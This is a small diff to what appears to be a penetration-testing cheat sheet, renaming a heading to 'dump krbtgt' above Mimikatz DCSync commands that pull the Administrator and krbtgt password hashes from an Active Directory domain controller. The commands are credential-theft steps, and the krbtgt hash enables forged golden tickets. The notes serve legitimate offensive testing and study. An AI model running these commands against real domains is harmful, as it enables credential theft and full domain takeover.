@@ -283,7 +283,7 @@ Does NOT need localadmin to run, just DC Replication privs:
 lsadump::dcsync /user:Administrator
 ```
 
-Golden - 
+dump krbtgt - 
 ```
 lsadump::dcsync /user:ecorp\krbtgt
 ```
